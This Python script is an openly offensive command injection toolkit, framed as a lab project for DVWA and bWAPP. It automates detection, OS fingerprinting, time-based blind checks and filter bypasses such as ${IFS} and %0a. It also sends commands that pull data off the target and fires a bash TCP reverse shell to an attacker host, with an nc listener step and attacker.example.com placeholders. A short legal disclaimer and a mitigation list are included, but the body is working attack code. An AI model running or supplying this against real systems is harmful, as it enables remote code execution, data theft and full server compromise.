#!/usr/bin/env python3
"""
Command Injection Exploitation Toolkit
Project #30: OS Command Injection Exploitation

LEGAL: Only test DVWA, bWAPP, PortSwigger labs, or your own apps.
"""

import sys
import os
import re
import json
import time
import argparse
import datetime
import urllib3
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote

import requests

from cmdi_payloads import (
    BASIC_PAYLOADS, FINGERPRINT_PAYLOADS, TIME_PAYLOADS,
    oob_dns, oob_http, SPACE_BYPASSES, OPERATOR_BYPASSES,
    COMMAND_BLACKLIST_BYPASSES, ENCODING_BYPASSES,
    EXFIL_COMMANDS, reverse_shells,
    DETECTION_INDICATORS, COMMON_PARAMS, TEST_MARKER,
)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Colors:
    GREEN   = '\033[92m'
    RED     = '\033[91m'
    YELLOW  = '\033[93m'
    BLUE    = '\033[94m'
    CYAN    = '\033[96m'
    WHITE   = '\033[97m'
    MAGENTA = '\033[95m'
    BOLD    = '\033[1m'
    RESET   = '\033[0m'

# ---------------------------------------------------------------------- #
class CommandInjectionExploit:
    def __init__(self, target, param=None, cookie=None, method='GET',
                 post_data=None, timeout=15, delay=0.3,
                 output_dir='.', verbose=False):
        self.target = target
        self.timeout = timeout
        self.delay = delay
        self.output_dir = output_dir
        self.verbose = verbose
        self.method = method.upper()
        self.post_data = post_data or {}

        self.parsed = urlparse(target)
        qs = parse_qs(self.parsed.query)
        if param:
            self.param = param
        elif qs:
            self.param = list(qs.keys())[0]
        else:
            print(f"{Colors.RED}[!] No parameter found{Colors.RESET}")
            sys.exit(1)

        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                          'AppleWebKit/537.36 (KHTML, like Gecko) '
                          'Chrome/120.0.0.0 Safari/537.36',
        })
        if cookie:
            self.session.headers['Cookie'] = cookie

        self.results = {
            'target': target,
            'parameter': self.param,
            'method': self.method,
            'timestamp': datetime.datetime.now().isoformat(),
            'vulnerable': False,
            'techniques': [],
            'os': None,
            'user': None,
            'fingerprint': {},
            'blind_time': [],
            'blind_oob': [],
            'bypasses': [],
            'exfil': {},
            'working_payloads': [],
            'reverse_shells': [],
            'error': None,
        }

        self.baseline_time = 0
        self.baseline_status = 0
        self.baseline_length = 0

    # ------------------------------------------------------------------ #
    def build_url(self, payload):
        qs = parse_qs(self.parsed.query, keep_blank_values=True)
        qs[self.param] = [payload]
        return urlunparse(self.parsed._replace(query=urlencode(qs, doseq=True)))

    def send(self, payload):
        time.sleep(self.delay)
        try:
            if self.method == 'POST':
                data = dict(self.post_data)
                data[self.param] = payload
                return self.session.post(
                    urlunparse(self.parsed._replace(query='')),
                    data=data, timeout=self.timeout, verify=False,
                    allow_redirects=False
                )
            else:
                return self.session.get(
                    self.build_url(payload),
                    timeout=self.timeout, verify=False,
                    allow_redirects=False
                )
        except Exception as e:
            if self.verbose:
                print(f"{Colors.YELLOW}[!] {str(e)[:60]}{Colors.RESET}")
            return None

    def send_timed(self, payload):
        """Send and return (response, elapsed)."""
        time.sleep(self.delay)
        start = time.time()
        try:
            if self.method == 'POST':
                data = dict(self.post_data)
                data[self.param] = payload
                r = self.session.post(
                    urlunparse(self.parsed._replace(query='')),
                    data=data, timeout=self.timeout + 30, verify=False,
                    allow_redirects=False
                )
            else:
                r = self.session.get(
                    self.build_url(payload),
                    timeout=self.timeout + 30, verify=False,
                    allow_redirects=False
                )
            return r, time.time() - start
        except Exception as e:
            return None, time.time() - start

    def get_baseline(self):
        print(f"    Getting baseline...")
        r, elapsed = self.send_timed('127.0.0.1')
        if r:
            self.baseline_time = elapsed
            self.baseline_status = r.status_code
            self.baseline_length = len(r.text)
            print(f"    Baseline: HTTP {r.status_code}, "
                  f"{self.baseline_length} bytes, {self.baseline_time:.2f}s")
            return r
        return None

    # ------------------------------------------------------------------ #
    # PHASE 1: DETECTION
    # ------------------------------------------------------------------ #
    def phase1_detection(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[📊] PHASE 1: DETECTION{Colors.RESET}")
        print(f"    Parameter: {self.param}")
        print(f"    Method:    {self.method}\n")

        self.get_baseline()
        if not self.baseline_status:
            print(f"{Colors.RED}[!] Cannot reach target{Colors.RESET}")
            self.results['error'] = 'unreachable'
            return

        print(f"\n    Testing basic injection operators:")
        found_any = False
        for name, payload in BASIC_PAYLOADS.items():
            r = self.send(payload)
            if not r:
                continue

            # Success = our marker appears in response
            if TEST_MARKER in r.text:
                print(f"      {Colors.GREEN}[+]{Colors.RESET} [{name:12}] "
                      f"CONFIRMED")
                self.results['techniques'].append(name)
                self.results['working_payloads'].append({
                    'name': name, 'payload': payload, 'type': 'basic'
                })
                found_any = True
            else:
                if self.verbose:
                    print(f"      {Colors.YELLOW}[-]{Colors.RESET} [{name:12}] "
                          f"no marker")

        if found_any:
            self.results['vulnerable'] = True
            print(f"\n    {Colors.GREEN}[✓] Command Injection CONFIRMED"
                  f" ({len(self.results['techniques'])} techniques){Colors.RESET}")
        else:
            print(f"\n    {Colors.RED}[✗] No command injection detected{Colors.RESET}")

    # ------------------------------------------------------------------ #
    # PHASE 2: FINGERPRINTING
    # ------------------------------------------------------------------ #
    def phase2_fingerprint(self):
        if not self.results['vulnerable']:
            return

        print(f"\n{Colors.BOLD}{Colors.BLUE}[📊] PHASE 2: OS FINGERPRINTING{Colors.RESET}")

        for name, (payload, pattern) in FINGERPRINT_PAYLOADS.items():
            r = self.send(payload)
            if not r:
                continue

            m = re.search(pattern, r.text, re.MULTILINE)
            if m:
                matched = m.group(0)[:100]

                if 'linux' in name:
                    self.results['os'] = 'Linux'
                elif 'win' in name:
                    self.results['os'] = 'Windows'
                if 'whoami' in name:
                    self.results['user'] = matched

                self.results['fingerprint'][name] = {
                    'payload': payload, 'output': matched
                }
                print(f"      {Colors.GREEN}[+]{Colors.RESET} [{name:16}] "
                      f"{matched}")

        if self.results['os']:
            print(f"\n    OS:   {self.results['os']}")
            print(f"    User: {self.results['user'] or 'unknown'}")

    # ------------------------------------------------------------------ #
    # PHASE 3: BLIND TIME-BASED
    # ------------------------------------------------------------------ #
    def phase3_blind_time(self):
        if not self.results['vulnerable']:
            return

        print(f"\n{Colors.BOLD}{Colors.BLUE}[📊] PHASE 3: BLIND TIME-BASED{Colors.RESET}")
        print(f"    Baseline time: {self.baseline_time:.2f}s")

        for name, (payload, expected_delay) in TIME_PAYLOADS.items():
            r, elapsed = self.send_timed(payload)
            if elapsed > self.baseline_time + expected_delay * 0.7:
                print(f"      {Colors.GREEN}[+]{Colors.RESET} [{name:16}] "
                      f"DELAY {elapsed:.2f}s (expected ~{expected_delay}s)")
                self.results['blind_time'].append({
                    'name': name, 'payload': payload,
                    'elapsed': elapsed, 'expected': expected_delay
                })
            else:
                if self.verbose:
                    print(f"      {Colors.YELLOW}[-]{Colors.RESET} [{name:16}] "
                          f"{elapsed:.2f}s")

    # ------------------------------------------------------------------ #
    # PHASE 4: FILTER BYPASS
    # ------------------------------------------------------------------ #
    def phase4_bypass(self):
        if not self.results['vulnerable']:
            return

        print(f"\n{Colors.BOLD}{Colors.BLUE}[📊] PHASE 4: FILTER BYPASS TESTING{Colors.RESET}")

        # Get a marker variant (unique to avoid caching)
        marker_cmd = 'echo CMDI_BYPASS_OK'

        bypasses = [
            ('space_ifs',       f';${{IFS}}{marker_cmd.replace(" ", "${IFS}")}'),
            ('space_tab',       f';%09{marker_cmd.replace(" ", "%09")}'),
            ('space_brace',     f';{{{marker_cmd.replace(" ", ",")}}}'),
            ('space_url',       f';%20{marker_cmd.replace(" ", "%20")}'),
            ('semicolon_url',   f'%3B{marker_cmd}'),
            ('pipe_url',        f'%7C{marker_cmd}'),
            ('newline',         f'%0a{marker_cmd}'),
        ]

        for name, payload in bypasses:
            r = self.send(payload)
            if r and 'CMDI_BYPASS_OK' in r.text:
                print(f"      {Colors.GREEN}[+]{Colors.RESET} [{name:16}] PASSED")
                self.results['bypasses'].append({
                    'name': name, 'payload': payload, 'status': 'passed'
                })
            else:
                print(f"      {Colors.RED}[✗]{Colors.RESET} [{name:16}] blocked")

        # Command name obfuscation
        print()
        for name, cmd in COMMAND_BLACKLIST_BYPASSES.items():
            payload = f'; {cmd}'
            r = self.send(payload)
            # Check for output (needs to match what the command would output)
            if r and ('whoami' not in cmd or 'www-data' in r.text or 'root' in r.text
                     or self.results['user'] in r.text if self.results['user'] else False):
                print(f"      {Colors.GREEN}[+]{Colors.RESET} [cmd_{name:12}] PASSED")
                self.results['bypasses'].append({
                    'name': f'cmd_{name}', 'payload': payload, 'status': 'passed'
                })
            else:
                if self.verbose:
                    print(f"      {Colors.YELLOW}[-]{Colors.RESET} "
                          f"[cmd_{name:12}] no clear output")

    # ------------------------------------------------------------------ #
    # PHASE 5: DATA EXFILTRATION
    # ------------------------------------------------------------------ #
    def phase5_exfil(self):
        if not self.results['vulnerable']:
            return

        print(f"\n{Colors.BOLD}{Colors.BLUE}[📊] PHASE 5: DATA EXFILTRATION{Colors.RESET}")

        os_type = self.results['os'] or 'linux'
        commands = EXFIL_COMMANDS.get(os_type, EXFIL_COMMANDS['linux'])

        for name, cmd in commands.items():
            r = self.send(cmd)
            if not r or r.status_code not in [200, 500]:
                continue

            # Extract <pre> content
            content = r.text
            m = re.search(r'<pre>(.*?)</pre>', content, re.DOTALL)
            output = m.group(1).strip() if m else ''

            # Only consider it success if we got output
            if output and len(output) > 5:
                # Truncate for display
                preview = output[:120].replace('\n', ' | ')
                print(f"      {Colors.GREEN}[+]{Colors.RESET} [{name:12}] "
                      f"{preview}")

                self.results['exfil'][name] = {
                    'command': cmd,
                    'output': output[:5000]
                }

    # ------------------------------------------------------------------ #
    # PHASE 6: REVERSE SHELL TEST (dry run)
    # ------------------------------------------------------------------ #
    def phase6_reverse_shell(self, attacker_host=None, port=4444):
        if not self.results['vulnerable']:
            return

        print(f"\n{Colors.BOLD}{Colors.BLUE}[📊] PHASE 6: REVERSE SHELL (dry run){Colors.RESET}")

        if not attacker_host:
            print(f"    {Colors.YELLOW}[!] No attacker host provided — showing payloads only{Colors.RESET}")
            print(f"    Use --attacker <host> --port <port> to actually test")
            print()
            shells = reverse_shells('attacker.example.com', 4444)
            for name, payload in list(shells.items())[:3]:
                print(f"      {Colors.CYAN}[{name}]{Colors.RESET}")
                print(f"          {payload[:120]}")
            return

        print(f"    Would connect back to {attacker_host}:{port}")
        print(f"    {Colors.YELLOW}[*] Setup listener first: nc -lvnp {port}{Colors.RESET}")

        # Only send FIRST payload (don't spam)
        shells = reverse_shells(attacker_host, port)
        test_payload = shells['bash_tcp']

        print(f"\n    Testing bash TCP payload...")
        print(f"    {Colors.CYAN}(Check listener on {attacker_host}:{port}){Colors.RESET}")

        r = self.send(test_payload)
        if r:
            self.results['reverse_shells'].append({
                'type': 'bash_tcp', 'payload': test_payload,
                'sent': True
            })
            print(f"    Sent — check your listener for a connection")

    # ------------------------------------------------------------------ #
    # REPORTS
    # ------------------------------------------------------------------ #
    def save_reports(self):
        os.makedirs(self.output_dir, exist_ok=True)
        ts = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')

        # JSON
        json_path = f"{self.output_dir}/cmdi_report_{ts}.json"
        with open(json_path, 'w', encoding='utf-8') as f:
            json.dump(self.results, f, indent=2, default=str)

        # Extracted data
        data_path = f"{self.output_dir}/cmdi_extracted_data.txt"
        with open(data_path, 'w', encoding='utf-8') as f:
            f.write("=" * 70 + "\n")
            f.write("COMMAND INJECTION EXTRACTION RESULTS\n")
            f.write("=" * 70 + "\n")
            f.write(f"Target:    {self.target}\n")
            f.write(f"Parameter: {self.param}\n")
            f.write(f"OS:        {self.results['os']}\n")
            f.write(f"User:      {self.results['user']}\n")
            f.write(f"Date:      {datetime.datetime.now()}\n\n")

            if self.results['exfil']:
                f.write("EXFILTRATED DATA\n" + "-" * 40 + "\n")
                for name, data in self.results['exfil'].items():
                    f.write(f"\n=== {name} ===\n")
                    f.write(f"Command: {data['command']}\n")
                    f.write(f"Output:\n{data['output']}\n")

        # Working payloads
        payloads_path = f"{self.output_dir}/working_payloads.txt"
        with open(payloads_path, 'w', encoding='utf-8') as f:
            f.write("WORKING COMMAND INJECTION PAYLOADS\n")
            f.write("=" * 70 + "\n\n")
            for p in self.results['working_payloads']:
                f.write(f"[{p['name']}]\n  {p['payload']}\n\n")
            for b in self.results['bypasses']:
                f.write(f"[bypass_{b['name']}]\n  {b['payload']}\n\n")

        print(f"\n{Colors.GREEN}[✓] JSON report:      {json_path}{Colors.RESET}")
        print(f"{Colors.GREEN}[✓] Extracted data:   {data_path}{Colors.RESET}")
        print(f"{Colors.GREEN}[✓] Working payloads: {payloads_path}{Colors.RESET}")

    def print_summary(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[📊] EXPLOITATION SUMMARY{Colors.RESET}")
        print(f"    Vulnerability:  Command Injection")
        print(f"    OS:             {self.results['os'] or 'unknown'}")
        print(f"    User:           {self.results['user'] or 'unknown'}")
        print(f"    Techniques:     {', '.join(self.results['techniques']) or 'none'}")
        print(f"    Blind (time):   {len(self.results['blind_time'])}")
        print(f"    Bypasses:       {len(self.results['bypasses'])}")
        print(f"    Data exfil:     {len(self.results['exfil'])} files/envs")
        print(f"    Severity:       {Colors.RED}CRITICAL{Colors.RESET}")

        print(f"\n    {Colors.YELLOW}Impact:{Colors.RESET}")
        print(f"        - Remote Code Execution (RCE)")
        print(f"        - Full server compromise")
        print(f"        - Data exfiltration")
        print(f"        - Reverse shell access")

        print(f"\n    {Colors.YELLOW}Mitigation:{Colors.RESET}")
        print(f"        1. Avoid shell=True / system() / exec()")
        print(f"        2. Use subprocess with arg list (no shell)")
        print(f"        3. Input validation (whitelist of allowed chars)")
        print(f"        4. Least privilege web server user")
        print(f"        5. WAF with command injection rules")
        print(f"        6. Network segmentation")

    def run(self, attacker_host=None, port=4444):
        print("\n" + "=" * 70)
        print(f"{Colors.BOLD}{Colors.MAGENTA}Command Injection Exploitation Toolkit{Colors.RESET}")
        print("=" * 70)
        print(f"{Colors.BOLD}Target:    {self.target}{Colors.RESET}")
        print(f"{Colors.BOLD}Parameter: {self.param}{Colors.RESET}")
        print(f"{Colors.BOLD}Method:    {self.method}{Colors.RESET}")

        self.phase1_detection()
        self.phase2_fingerprint()
        self.phase3_blind_time()
        self.phase4_bypass()
        self.phase5_exfil()
        self.phase6_reverse_shell(attacker_host, port)

        self.print_summary()
        self.save_reports()

# ---------------------------------------------------------------------- #
def main():
    p = argparse.ArgumentParser(
        description="Command Injection Exploitation (Project #30)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # DVWA
  python command_injection.py \\
    "http://localhost/vulnerabilities/exec/?ip=127.0.0.1&Submit=Submit" \\
    --param ip --cookie "PHPSESSID=xxx; security=low"

  # Your own app
  python command_injection.py "http://localhost:5555/ping?ip=127.0.0.1" --param ip

  # Reverse shell (needs listener: nc -lvnp 4444)
  python command_injection.py "URL" --param ip --attacker your-ip --port 4444
        """
    )
    p.add_argument('url', help='Target URL')
    p.add_argument('--param', help='Parameter to inject')
    p.add_argument('--cookie', help='Cookie header')
    p.add_argument('--method', default='GET', choices=['GET', 'POST'])
    p.add_argument('--post-data', default='', help='POST data (for POST method)')
    p.add_argument('--attacker', help='Your IP for reverse shell tests')
    p.add_argument('--port', type=int, default=4444, help='Reverse shell port')
    p.add_argument('-t', '--timeout', type=int, default=15)
    p.add_argument('--delay', type=float, default=0.3)
    p.add_argument('-o', '--output', default='.')
    p.add_argument('-v', '--verbose', action='store_true')

    args = p.parse_args()

    post_data = {}
    if args.post_data:
        for pair in args.post_data.split('&'):
            if '=' in pair:
                k, v = pair.split('=', 1)
                post_data[k] = v

    print(f"{Colors.CYAN}{Colors.BOLD}")
    print("=" * 70)
    print("  COMMAND INJECTION EXPLOITATION")
    print("  Project #30: OS Command Injection Toolkit")
    print("=" * 70)
    print(f"{Colors.RESET}")
    print(f"{Colors.YELLOW}⚠️  Legal: Only test DVWA, bWAPP, PortSwigger labs, or your own apps.{Colors.RESET}\n")

    exploit = CommandInjectionExploit(
        target=args.url,
        param=args.param,
        cookie=args.cookie,
        method=args.method,
        post_data=post_data,
        timeout=args.timeout,
        delay=args.delay,
        output_dir=args.output,
        verbose=args.verbose,
    )
    exploit.run(attacker_host=args.attacker, port=args.port)

if __name__ == '__main__':
    main()